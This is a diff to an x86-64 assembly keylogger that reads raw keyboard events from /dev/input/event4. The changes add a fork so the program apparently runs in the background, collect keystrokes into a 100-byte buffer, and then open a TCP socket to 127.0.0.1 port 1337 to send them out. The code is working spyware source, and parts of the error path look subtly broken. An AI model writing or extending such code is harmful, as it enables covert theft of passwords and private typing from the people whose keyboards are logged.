@@ -23,7 +23,11 @@ _start:
   test rax, rax
   js error
 
+  mov rax, 57
+  syscall
+
   jmp readKey
+
 
   mov rax, 60
   xor rdi, rdi
@@ -91,6 +95,49 @@ writeKey:
   mov rdx, 1
   syscall
 
+  mov al, [counter]
+  mov bl, [key]
+  mov byte [keys + eax],bl 
+
+  add byte [counter], 1
+  cmp byte [counter], 100
+  je sendKeys
+
+  jmp readKey 
+
+sendKeys:
+  mov rax, 41
+  mov rdi, 0x2 
+  mov rsi, 0x1
+  xor rdx, rdx
+  syscall
+ 
+  mov [socket], rax
+
+  mov rax, 42
+  mov rdi, [socket]
+
+  mov word [addr], 0x2 
+  mov bx, [port]
+  mov word [addr + 2], bx 
+  mov ebx, [serv]
+  mov dword [addr + 4], ebx 
+ 
+  mov rsi, addr
+  mov rdx, 16
+  syscall
+
+  mov rax, 1
+  mov rdi, [socket]
+  mov rsi, keys
+  mov rdx, 100
+  syscall
+
+  mov rax, 3
+  mov rdi, [socket]
+  syscall
+
+  mov byte [counter], 0
   jmp readKey
 
 error:
@@ -102,10 +149,14 @@ error:
 
   mov rax, 60
   mov rdi, 1
+  mov rsi, keys
+  mov rdx, 100
   syscall
 
+  jmp readKey
+
 section .data
-  errorMsg db "Error opening file", 0xa
+  errorMsg db "must be run as root", 0xa
   errorMsgLen equ $ - errorMsg
 
   source db "/dev/input/event4", 0
@@ -114,11 +165,19 @@ section .data
   file db "./key.log", 0
   fd dq 0
 
-  lowerKeys db `??1234567890-=\b\tazertyuiop[]\n?qsdfghjkl\;'\`?\mwxcvbn,./?*? `
-  upperKeys db `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKL\;'\`?\MWXCVBN,./?*? `
+  lowerKeys dw `??\&2\"\'(\-7\_90-=\b\tazertyuiop[]\n?qsdfghjklm,'\`?\wxcvbn,.:?*?\s?`
+  upperKeys dw `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKLM,'\`?\WXCVBN?./?*?\s?`
 
-  mode db 0, 0
+  serv dd 0x0100007f
+  port dw 0x3905
+
+  socket dq 0
+
+  mode db 0
+  counter db 0
 
 section .bss
   event resb 24
   key resb 1
+  keys resb 100
+  addr resb 16
